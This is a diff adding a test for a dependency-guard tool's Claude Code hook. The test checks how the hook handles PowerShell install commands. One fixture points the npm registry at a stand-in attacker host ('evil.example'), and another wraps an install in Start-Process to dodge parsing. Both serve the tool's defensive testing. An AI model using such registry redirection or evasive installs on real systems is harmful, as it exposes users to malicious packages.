@@ -212,6 +212,23 @@ describe('depcurfew check --hook claude-code', () => {
     expect(result).toEqual({ code: EXIT_OK, stdout: '', stderr: '' });
   });
 
+  it('reads the commands of the PowerShell tool, the main shell on Windows', async () => {
+    const directory = project({ cooldown: { minimum: '3d' } });
+    const hook = (command: string) => exec(['check', '--hook', 'claude-code'], event(command, directory, 'PowerShell'));
+    const denied = await hook('pnpm add lodash; npm i this-package-does-not-exist-xyz-123');
+    expect(decision(denied.stdout)).toMatchObject({ permissionDecision: 'deny' });
+    expect(decision(denied.stdout).permissionDecisionReason).toContain('- this-package-does-not-exist-xyz-123: this-package-does-not-exist-xyz-123 does not exist in the registry');
+    const asked = await hook("Start-Process -Wait npm -ArgumentList 'i lodash'");
+    expect(decision(asked.stdout)).toMatchObject({ permissionDecision: 'ask' });
+    expect(decision(asked.stdout).permissionDecisionReason).toBe(
+      "depcurfew cannot vouch for what this command installs:\n- Start-Process -Wait npm -ArgumentList 'i lodash': depcurfew does not read \"Start-Process\" in PowerShell, and the statement names npm. Fix: Run the package manager as a plain command with the package names written out (no variables, (...), {...}, Start-Process or aliases), so depcurfew can check them",
+    );
+    expect(decision((await hook('$env:npm_config_registry = "https://evil.example"; npm i lodash')).stdout)).toMatchObject({ permissionDecision: 'ask' });
+    expect((await hook("& 'C:\\Program Files\\nodejs\\npm.cmd' install lodash")).stdout).toBe('');
+    expect((await hook('git status; Get-ChildItem -Recurse | Where-Object { $_.Length -gt 1kb }')).stdout).toBe('');
+    expect((await hook('npm run build 2>$null; if ($LASTEXITCODE -ne 0) { exit 1 }')).stdout).toBe('');
+  });
+
   it('finds depcurfew.json in a parent of the working directory, inside the same git repository', async () => {
     const directory = project({ installScripts: { default: 'deny', allow: ['esbuild'] } });
     mkdirSync(join(directory, '.git'));
